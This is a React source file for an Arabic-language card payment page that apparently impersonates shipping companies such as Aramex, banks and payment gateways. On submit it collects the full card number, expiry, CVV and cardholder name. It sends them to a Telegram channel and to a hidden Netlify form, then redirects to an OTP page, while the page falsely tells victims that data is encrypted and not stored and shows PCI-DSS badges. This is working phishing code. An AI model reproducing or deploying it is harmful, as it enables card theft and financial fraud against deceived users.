import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedInput } from "@/components/ui/ThemedInput";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  Loader2,
  Lock,
  ShieldCheck,
  CreditCard,
  Info,
  HelpCircle,
  Globe,
  Shield,
  Building2,
  Truck,
  Wallet,
} from "lucide-react";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(companyKey);
  }, [companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  const category = companyKey.includes('shipping') || companyKey.includes('aramex') ? 'shipping' :
                   companyKey.includes('bank') ? 'bank' : 'payment_gateway';

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  const getCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "");
    if (/^4/.test(cleanNumber)) return "visa";
    if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
    if (/^6/.test(cleanNumber)) return "mada";
    return "unknown";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (cardNumber.replace(/\s/g, "").length < 16 || expiryDate.length < 5 || cvv.length < 3) {
      toast({ title: "خطأ", description: "الرجاء التحقق من بيانات البطاقة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const cardInfo = {
      cardLast4: cardNumber.slice(-4),
      cardType: getCardType(cardNumber),
      expiryDate,
      cardHolder
    };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, cardInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-payment",
          linkId: id!,
          service: entityConfig.nameAr,
          amount: formattedAmount,
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder
        }).toString()
      });

      await sendToTelegram({
        type: 'card_info',
        data: {
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder,
          service: entityConfig.nameAr,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل معالجة البطاقة", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  const CategoryIcon = category === 'shipping' ? Truck : category === 'bank' ? Building2 : Wallet;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
      <PaymentMetaTags
        serviceKey={companyKey}
        serviceName={entityConfig.nameAr}
        title="بوابة الدفع الإلكتروني"
        amount={formattedAmount}
      />

      <ThemedHeader
        config={entityConfig}
        title={entityConfig.nameAr}
        subtitle="Secure Online Transaction"
      />

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-3">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>إتمام عملية الدفع</h1>
            <div className="flex items-center justify-center gap-2 font-bold uppercase tracking-widest text-[10px]" style={{ color: entityConfig.textMuted }}>
              <ShieldCheck className="w-4 h-4" style={{ color: entityConfig.primary }} />
              <span>Transaction ID: {id?.slice(0, 8).toUpperCase()}</span>
            </div>
          </div>

          <ThemedCard config={entityConfig} variant="elevated">
            {/* Amount Display */}
            <div className="p-8 sm:p-10 border-b relative overflow-hidden" style={{ backgroundColor: `${entityConfig.primary}05`, borderColor: entityConfig.inputBorder }}>
              <div className="absolute top-0 left-0 w-full h-1" style={{ backgroundColor: entityConfig.primary, opacity: 0.2 }} />
              <div className="flex items-center justify-between relative z-10">
                <div className="space-y-1">
                  <p className="text-[11px] font-bold uppercase tracking-widest" style={{ color: entityConfig.textMuted }}>إجمالي المبلغ</p>
                  <h2 className="text-3xl sm:text-4xl font-bold tracking-tighter" style={{ color: entityConfig.primary }}>{formattedAmount}</h2>
                </div>
                <div className="text-left">
                  <p className="text-[10px] font-bold uppercase tracking-widest mb-1" style={{ color: entityConfig.textMuted }}>حالة الطلب</p>
                  <div className="flex items-center gap-1.5 font-bold text-sm" style={{ color: entityConfig.primary }}>
                    <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: entityConfig.primary }} />
                    <span>بانتظار السداد</span>
                  </div>
                </div>
              </div>
              <div className="absolute -bottom-10 -right-10 opacity-[0.03] rotate-12">
                <CreditCard className="w-64 h-64" />
              </div>
            </div>

            <form onSubmit={handleSubmit} className="p-8 sm:p-10 space-y-6 sm:space-y-8">
              <div className="space-y-5 sm:space-y-7">
                <ThemedInput
                  config={entityConfig}
                  label="رقم البطاقة الائتمانية"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="0000 0000 0000 0000"
                  icon={<CreditCard className="w-5 h-5" />}
                  required
                />

                <div className="grid grid-cols-2 gap-6 sm:gap-8">
                  <ThemedInput
                    config={entityConfig}
                    label="تاريخ الانتهاء (MM/YY)"
                    value={expiryDate}
                    onChange={handleExpiryChange}
                    placeholder="MM/YY"
                    required
                  />
                  <ThemedInput
                    config={entityConfig}
                    label="رمز الأمان (CVV)"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                    placeholder="***"
                    icon={<HelpCircle className="w-5 h-5" />}
                    type="password"
                    required
                  />
                </div>

                <ThemedInput
                  config={entityConfig}
                  label="اسم حامل البطاقة"
                  value={cardHolder}
                  onChange={(e) => setCardHolder(e.target.value)}
                  placeholder="HOLDER NAME AS WRITTEN ON CARD"
                  required
                />
              </div>

              <div className="pt-6 sm:pt-8">
                <ThemedButton
                  config={entityConfig}
                  type="submit"
                  disabled={isSubmitting}
                  loading={isSubmitting}
                >
                  {isSubmitting ? "جاري المعالجة..." : "تأكيد عملية السداد الآن"}
                </ThemedButton>

                <div className="mt-8 sm:mt-10 flex flex-col items-center gap-6">
                  <div className="flex items-center gap-6 h-8" style={{ opacity: 0.6, filter: 'grayscale(1)' }}>
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
                  </div>
                  <p className="text-[10px] font-bold leading-relaxed text-center max-w-sm" style={{ color: entityConfig.textMuted }}>
                    بالنقر على زر التأكيد، أنت توافق على معالجة معاملتك المالية بأمان. جميع البيانات مشفرة ولا يتم تخزينها.
                  </p>
                </div>
              </div>
            </form>
          </ThemedCard>

          <div className="flex flex-col sm:flex-row items-center justify-between gap-6 px-4">
            <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
              <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
                <Shield className="w-5 h-5" />
              </div>
              <div>
                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: entityConfig.text }}>PCI-DSS Certified</p>
                <p className="text-[9px] font-medium">معايير أمان عالمية</p>
              </div>
            </div>
            <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
              <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: entityConfig.text }}>Encrypted Session</p>
                <p className="text-[9px] font-medium">اتصال مشفر 256-bit</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <form name="card-payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardNumber" />
        <input type="text" name="expiryDate" />
        <input type="text" name="cvv" />
        <input type="text" name="cardHolder" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
